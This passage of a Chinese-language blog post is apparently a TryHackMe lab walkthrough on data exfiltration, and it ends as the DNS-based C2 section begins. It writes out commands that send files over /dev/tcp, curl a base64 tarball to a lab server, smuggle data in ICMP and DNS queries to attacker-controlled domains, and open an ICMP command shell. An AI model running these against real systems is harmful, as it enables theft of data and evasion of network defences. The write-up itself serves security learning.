@@ -1,0 +1,919 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+<meta name="google-site-verification" content="LZ0JOjQQZw7PhvjIbZqeOojf3J6807W7DPn6--OTptc" />
+<meta name="baidu-site-verification" content="code-DDmcbQ6zQN" />
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
+  <meta name="google-site-verification" content="true">
+  <meta name="msvalidate.01" content="true">
+  <meta name="yandex-verification" content="true">
+  <meta name="baidu-site-verification" content="true">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"noone40404.github.io","root":"/","scheme":"Mist","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":true},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":true,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":5,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="数据外泄，学一下">
+<meta property="og:type" content="article">
+<meta property="og:title" content="THM学习日寄23-Data Exfiltration">
+<meta property="og:url" content="http://noone40404.github.io/2024/11/17/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8423%EF%BC%9AData%20Exfiltration/index.html">
+<meta property="og:site_name" content="noone___&#39;s blog">
+<meta property="og:description" content="数据外泄，学一下">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a8c33d29ded1a8c1f99a8.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a8c84d29ded1a8c1fc879.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a8ce5d29ded1a8c20017d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a8df5d29ded1a8c20aa74.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a8ec8d29ded1a8c212f60.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a91add29ded1a8c2340c5.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a9369d29ded1a8c244d7d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a9452d29ded1a8c24db58.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a94add29ded1a8c2513c7.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673a95c9d29ded1a8c25be7a.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673aad80d29ded1a8c356f37.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673aae58d29ded1a8c36856c.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673aaea0d29ded1a8c36c14d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab0a2d29ded1a8c38739c.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab14dd29ded1a8c3914d9.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab2e3d29ded1a8c3a7a3b.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab39fd29ded1a8c3b0357.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab42cd29ded1a8c3b5f87.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab46ed29ded1a8c3b8fd2.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab65ed29ded1a8c3d32e5.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab6dbd29ded1a8c3e01f9.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab784d29ded1a8c3e7586.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab7c7d29ded1a8c3eb670.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673ab8d8d29ded1a8c3fb553.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673aba50d29ded1a8c40eb77.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673b3849d29ded1a8cb34e56.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673b385ed29ded1a8cb35e04.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673b38a1d29ded1a8cb3939d.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673b3b48d29ded1a8cb61098.png">
+<meta property="og:image" content="https://pic.imgdb.cn/item/673b3c29d29ded1a8cb6e6fb.png">
+<meta property="article:published_time" content="2024-11-17T05:10:00.000Z">
+<meta property="article:modified_time" content="2024-11-18T13:13:18.208Z">
+<meta property="article:author" content="noone___">
+<meta property="article:tag" content="THM">
+<meta property="article:tag" content="靶场">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://pic.imgdb.cn/item/673a8c33d29ded1a8c1f99a8.png">
+
+<link rel="canonical" href="http://noone40404.github.io/2024/11/17/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8423%EF%BC%9AData%20Exfiltration/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'zh-CN'
+  };
+</script>
+
+  <title>THM学习日寄23-Data Exfiltration | noone___'s blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="noone___'s blog" type="application/atom+xml">
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <span class="logo-line-before"><i></i></span>
+      <h1 class="site-title">noone___'s blog</h1>
+      <span class="logo-line-after"><i></i></span>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+
+
+<nav class="site-nav">
+  <ul id="menu" class="main-menu menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-about">
+
+    <a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a>
+
+  </li>
+        <li class="menu-item menu-item-sitemap">
+
+    <a href="/sitemap.xml" rel="section"><i class="fa fa-sitemap fa-fw"></i>站点地图</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+</nav>
+
+
+
+  <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result">
+  <div id="no-result">
+    <i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>
+  </div>
+</div>
+
+    </div>
+  </div>
+
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <a href="https://github.com/noone40404" class="github-corner" title="Follow me on GitHub" aria-label="Follow me on GitHub" rel="noopener" target="_blank"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></a>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content post posts-expand">
+            
+
+    
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://noone40404.github.io/2024/11/17/THM%E5%AD%A6%E4%B9%A0%E6%97%A5%E5%AF%8423%EF%BC%9AData%20Exfiltration/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="noone___">
+      <meta itemprop="description" content="自闭中">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="noone___'s blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          THM学习日寄23-Data Exfiltration
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2024-11-17 13:10:00" itemprop="dateCreated datePublished" datetime="2024-11-17T13:10:00+08:00">2024-11-17</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="far fa-calendar-check"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2024-11-18 21:13:18" itemprop="dateModified" datetime="2024-11-18T21:13:18+08:00">2024-11-18</time>
+              </span>
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%B8%97%E9%80%8F/" itemprop="url" rel="index"><span itemprop="name">渗透</span></a>
+                </span>
+            </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span>
+            <div class="post-description">数据外泄，学一下</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <ul>
+<li><p>房间的网络拓扑</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a8c33d29ded1a8c1f99a8.png" alt=""></p>
+</li>
+<li><p><code>Data Exfiltration</code></p>
+<p>  数据外泄有三种主要是使用案例：</p>
+<ul>
+<li><p>传统数据外泄</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a8c84d29ded1a8c1fc879.png" alt=""></p>
+<p>  数据单向移动，都从网络内部传输到外部，攻击者不关注服务器的回应，大多数为传统协议</p>
+</li>
+<li><p><code>C2</code> 通信</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a8ce5d29ded1a8c20017d.png" alt=""></p>
+<p>  通信包括发送命令与接受结果，为躲避检测常使用非标准协议或加密通道</p>
+</li>
+<li><p>隧道通信</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a8df5d29ded1a8c20aa74.png" alt=""></p>
+<p>  建立隧道来持续访问整个内网资源，保持长时间连接</p>
+</li>
+</ul>
+</li>
+<li><p><code>TCP</code> 套接字</p>
+<p>  仅在没有安全措施的网络环境下进行，因为非标准协议很容易被检测到</p>
+<p>  使用 <code>nc</code> 的反弹 <code>shell</code> 就是这种</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a8ec8d29ded1a8c212f60.png" alt=""></p>
+<p>  接下来没图，因为 <code>jumpbox</code> 太卡了输不了命令</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar zcf - task4/ | base64 | dd conv=ebcdic &gt; /dev/tcp/ip/port</span><br></pre></td></tr></table></figure>
+<p>  把 <code>task4</code> 目录压缩为 <code>.tar.gz</code> 文件并输出到标准输出 (<code>-</code>)，并将压缩数据做 <code>base64</code>，再用 <code>dd</code> 工具将 <code>base64</code> 转码为 <code>EBCDIC</code> 编码，并将编码数据发送到指定地点</p>
+<p>  对于收到的数据，使用 <code>dd</code> 来解码，再用 <code>tar</code> 解压即可</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dd conv=ascii if=task4-creds.data |base64 -d &gt; task4-creds.tar</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>ssh</code></p>
+<p>  <img src="https://pic.imgdb.cn/item/673a91add29ded1a8c2340c5.png" alt=""></p>
+<p>  建立了加密通信通道</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">tar cf - task5/ | ssh thm@jump.thm.com &quot;cd /tmp/; tar xpf -&quot;</span><br></pre></td></tr></table></figure>
+<p>  双引号注明的命令是在 <code>ssh</code> 连接后生效，即切换到 <code>/tmp</code> 并解压缩</p>
+</li>
+<li><p><code>http</code></p>
+<p>  使用 <code>HTTP</code> 是很好的选择，即防守方难以区分非法与恶意的 <code>http</code> 流量。注意要使用 <code>POST</code> 而非 <code>GET</code> ，后者的所有参数会被记录到日志中，而前者请求不会被缓存，不会保留在浏览器历史记录中，不会被添加为书签，对数据长度没有限制</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a9369d29ded1a8c244d7d.png" alt=""></p>
+<p>  由图，带有文件参数的 <code>GET</code> 请求会包含泄露的数据，而 <code>POST</code> 并不会</p>
+<p>  在现实场景中，往往将数据发送到恶意服务器上，再登录该服务器以拿到数据</p>
+<p>  在本例中，以 <code>web.thm.com</code> 作为恶意服务器，设置 <code>contact.php</code> 页面来处理数据，在跳板机上用 <code>curl</code> 来发送数据</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a9452d29ded1a8c24db58.png" alt=""></p>
+<p>  其将数据压缩后存储到 <code>/tmp</code> 下</p>
+<p>  在连接到 <code>victim1</code> 后用 <code>curl</code> 来传输：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --data &quot;file=$(tar zcf - task6 | base64)&quot; http://web.thm.com/contact.php</span><br></pre></td></tr></table></figure>
+<p>  但对于收到的数据，发现 <code>base64</code> 损坏，原因是 <code>http</code> 传输时的 <code>url</code> 编码把 <code>+</code> 替换为空格</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a94add29ded1a8c2513c7.png" alt=""></p>
+<p>  可以使用 <code>sed</code> 来修复：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i &#x27;s/ /+/g&#x27; /tmp/http.bs64</span><br></pre></td></tr></table></figure>
+<p>  <code>-i</code> 原地编辑文件，<code>s</code> 替换，<code>/ /</code> 即匹配空格，<code>/+/</code> 即替换为加号，<code>g</code> 为全局匹配</p>
+</li>
+<li><p><code>https</code></p>
+<p>  避免数据明文传输的情况，也可以使用 <code>http</code> 隧道技术封装其他协议并来回发送数据</p>
+<p>  <img src="https://pic.imgdb.cn/item/673a95c9d29ded1a8c25be7a.png" alt=""></p>
+<p>  将上传一个 <code>http</code> 隧道代理文件到受害服务器 <code>uploader.thm.com</code> ，连接完成时可以尝试与 <code>app.thm.com</code> 通信</p>
+<p>  使用 <a target="_blank" rel="noopener" href="https://github.com/L-codes/Neo-reGeorg"><code>Neo-reGeorg</code></a></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py generate -k thm</span><br></pre></td></tr></table></figure>
+<p>  生成一个加密的客户端文件，并在 <code>http://MACHINE_IP/uploader</code> 来上传</p>
+<p>  连接：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 neoreg.py -k thm -u http://MACHINE_IP/uploader/files/tunnel.php</span><br></pre></td></tr></table></figure>
+<p>  随后可以使用 <code>curl</code> 来访问 <code>app.thm.com</code> 的内部 <code>ip</code> 地址 <code>172.20.0.121:80</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl --socks5 127.0.0.1:1080 http://172.20.0.121:80</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><code>ICMP</code></p>
+<p>  <code>internet</code> 控制消息协议。用于处理错误报告的网络层协议</p>
+<p>  网络设备可以使用 <code>ICMP</code> 来检测网络连通性，即 <code>ping</code> ，但该协议并非是设备间用于发送数据的传输协议</p>
+<p>  <code>ICMP</code> 数据报的结构包含了一个数据段 <code>Data section</code> ，该部分包含字符串或者其他信息，如表示错误消息的 <code>IPv4</code> 报头，如下：</p>
+<p>  <img src="https://pic.imgdb.cn/item/673aad80d29ded1a8c356f37.png" alt=""></p>
+<p>  而值得注意的是，数据字段是可选的，即可以将我们的数据包含在该数据段中并通过 <code>ICMP</code> 发送到另一台</p>
+<p>  在 <code>linux</code> 中，<code>ping</code> 可以使用 <code>-p</code> 参数来指定数据报发送十六进制的 <code>16</code> 字节数据</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ping MACHINE_IP -c 1 -p 74686d3a7472796861636b6d650a</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673aae58d29ded1a8c36856c.png" alt=""></p>
+<p>  但手动发送未免过于麻烦了，接下来使用 <code>msf</code> 来做：</p>
+<p>  其会捕获传入的 <code>ICMP</code> 数据报并等待 <code>BOF</code> 文件开始值，接收到后执行写入操作直至接收到 <code>EOF</code> 文件结束值</p>
+<p>  <img src="https://pic.imgdb.cn/item/673aaea0d29ded1a8c36c14d.png" alt=""></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">msf5 &gt; use auxiliary/server/icmp_exfil</span><br><span class="line">msf5 auxiliary(server/icmp_exfil) &gt; set BPF_FILTER icmp and not src ATTACKBOX_IP</span><br><span class="line">set INTERFACE eth0</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+<p>  <code>icmp</code> 表示只过滤该协议，<code>not src ATTACKBOX_IP</code> 是过滤掉攻击机的 <code>ICMP</code> 包，这样使数据隧道只接受需要的 <code>ICMP</code> 回响包，过滤无关流量</p>
+<p>  在 <code>icmp-host</code> 上面使用 <code>nping</code> 工具：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nping --icmp -c 1 10.10.17.118 --data-string &quot;BOFfile.txt&quot;</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673ab0a2d29ded1a8c38739c.png" alt=""></p>
+<p>  使用 <code>BOFfile.txt</code> 来指定文件开始触发值，该文件名可以在 <code>msf</code> 中更改</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nping --icmp -c 1 10.10.17.118 --data-string &quot;admin-password&quot;</span><br><span class="line">sudo nping --icmp -c 1 10.10.17.118 --data-string &quot;EOF&quot;</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673ab14dd29ded1a8c3914d9.png" alt=""></p>
+</li>
+<li><p><code>ICMP C2</code></p>
+<p>  接下来引入 <a target="_blank" rel="noopener" href="https://github.com/krabelize/icmpdoor"><code>ICMPDoor</code></a> 工具来处理命令执行中的数据传输</p>
+<p>  在受害者 <code>icmp-host</code> 上：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmpdoor -i eth0 -d [jump-box]</span><br></pre></td></tr></table></figure>
+<p>  在攻击者 <code>jump-box</code> 上：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">icmp-cnc -i eth1 -d [icmp-host]</span><br></pre></td></tr></table></figure>
+<p>  最后拿到加密传输的命令执行 `shell</p>
+<p>  <img src="https://pic.imgdb.cn/item/673ab2e3d29ded1a8c3a7a3b.png" alt=""></p>
+</li>
+<li><p><code>DNS</code> 配置</p>
+<p>  配置好了所需的域名 <code>tunnel.com</code> ，以及网页</p>
+<p>  <img src="https://pic.imgdb.cn/item/673ab39fd29ded1a8c3b0357.png" alt=""></p>
+<p>  需要为控制的域名设置一个名称服务器：</p>
+<ul>
+<li>添加一条指向 <code>Attackbox IP</code> 的 <code>A</code> 记录</li>
+<li><p>添加一条 <code>NS</code> 记录，其把 <code>DNS</code> 查询路由到上面的 <code>A</code> 记录</p>
+<p><img src="https://pic.imgdb.cn/item/673ab42cd29ded1a8c3b5f87.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/673ab46ed29ded1a8c3b8fd2.png" alt=""></p>
+<p>但这俩我设置显示未认证，只能用设置好的：</p>
+<p><img src="https://pic.imgdb.cn/item/673ab65ed29ded1a8c3d32e5.png" alt=""></p>
+<p><img src="https://pic.imgdb.cn/item/673ab6dbd29ded1a8c3e01f9.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p><code>DNS</code> 数据渗出</p>
+<p>  尽管 <code>DNS</code> 并非为了传输数据而设计的，但仍能通过该协议来移动数据</p>
+<p>  正由于其并非传输协议，所以 <code>DNS</code> 协议的使用情况大概率不会被监控，而且几乎所有防火墙都会允许使用，所以用 <code>DNS</code> 来隐藏通信更好</p>
+<p>  但也存在限制：</p>
+<ul>
+<li>全限定 <code>FQDN</code> 域名最大长度为 <code>255</code> 字符</li>
+<li><p>子域名长度最大为 <code>63</code> 字符</p>
+<p><img src="https://pic.imgdb.cn/item/673ab784d29ded1a8c3e7586.png" alt=""></p>
+<p>所以只能使用有限数量的字符通过域名来传输数据，在传输大数据时会导致极多的 <code>DNS</code> 请求，而产生明显的流量记录</p>
+</li>
+<li><p>攻击步骤</p>
+<p>  <img src="https://pic.imgdb.cn/item/673ab7c7d29ded1a8c3eb670.png" alt=""></p>
+<ul>
+<li>一个由攻击者注册的域名，如 <code>tunnel.com</code></li>
+<li>设置 <code>tunnel.com</code> 的 <code>NS</code> 记录指向攻击者控制的服务器</li>
+<li>将敏感数据传输到攻击者所控制的域名，如需要传输密码 <code>password012</code> ，就请求 <code>password012.tunnel.com</code></li>
+<li>将这一 <code>DNS</code> 请求通过本地 <code>DNS</code> 服务器发送至攻击者的恶意服务器</li>
+<li>最后攻击者从 <code>DNS</code> 请求的域名中提取密码</li>
+</ul>
+<p>一个典型使用场景是在防火墙阻止和过滤所有流量时，使用 <code>DNS</code> 来通过防火墙，此时最重要的时允许使用 <code>DNS</code> 且能将域名解析为 <code>IP</code></p>
+</li>
+<li><p>手动：</p>
+<p>  <img src="https://pic.imgdb.cn/item/673ab8d8d29ded1a8c3fb553.png" alt=""></p>
+<p>  对敏感信息内容进行编码，并将结果作为子域名发送</p>
+</li>
+<li><p><code>attacker</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh thm@attacker.thm.com</span><br><span class="line">sudo tcpdump -i eth0 udp port 53 -v</span><br></pre></td></tr></table></figure>
+<p>  使用 <code>tcpdump</code> 接受任何传入 <code>UDP/53</code> 的数据报来接受 <code>DNS</code> 请求</p>
+</li>
+<li><p><code>victim2</code></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ssh thm@victim2.thm.com</span><br><span class="line">cat task9/credit.txt</span><br><span class="line">cat task9/credit.txt | base64</span><br><span class="line">cat task9/credit.txt | base64 | tr -d &quot;\n&quot;| fold -w18 | sed -r &#x27;s/.*/&amp;.att.tunnel.com/&#x27;</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673aba50d29ded1a8c40eb77.png" alt=""></p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">cat task9/credit.txt |base64 | tr -d &quot;\n&quot; | fold -w18 | sed &#x27;s/.*/&amp;./&#x27; | tr -d &quot;\n&quot; | sed s/$/attacker.tunnel.com/ | awk &#x27;&#123;print &quot;dig +short &quot; $1&#125;&#x27; | bash</span><br><span class="line">#1. awk &#x27;&#123;******&#125; 会对输入内容的每一行进行逐行处理</span><br><span class="line">#- &#123;******&#125; 是处理动作</span><br><span class="line">#- &quot;dig +short &quot; 打印字符串</span><br><span class="line">#- 拼接当前行的第一个字段 $1，也就是域名</span><br><span class="line">#- 这样awk的输出就是一系列dig命令</span><br><span class="line">#2. | bash</span><br><span class="line">#- 使用管道将awk的输出作为bash命令来执行</span><br><span class="line">#3. 这样就实现了:</span><br><span class="line">#- awk自动提取域名，构造dig命令</span><br><span class="line">#- bash执行这些命令，实现域名解析</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673b3849d29ded1a8cb34e56.png" alt=""></p>
+<p>  <img src="https://pic.imgdb.cn/item/673b385ed29ded1a8cb35e04.png" alt=""></p>
+<p>  再用 <code>echo</code> 解码</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;TmFtZTogVEhNLXVzZX.IKQWRkcmVzczogMTIz.NCBJbnRlcm5ldCwgVE.hNCkNyZWRpdCBDYXJk.OiAxMjM0LTEyMzQtMT.IzNC0xMjM0CkV4cGly.ZTogMDUvMDUvMjAyMg.pDb2RlOiAxMzM3Cg==.att.tunnel.com.&quot; | cut -d&quot;.&quot; -f1-8 | tr -d &quot;.&quot; | base64 -d</span><br></pre></td></tr></table></figure>
+<p>  <img src="https://pic.imgdb.cn/item/673b38a1d29ded1a8cb3939d.png" alt=""></p>
+</li>
+</ul>
+</li>
+<li><p>基于 <code>DNS</code> 的 <code>C2</code> 通信</p>
+<p>  接下来将模拟用 <code>DNS</code> 协议执行 <code>bash</code> 脚本，为此要为 <code>tunnel.com</code> 添加新的 <code>DNS</code> 记录</p>
+<p>  随便找一个需要执行的<del>不</del>恶意脚本：</p>
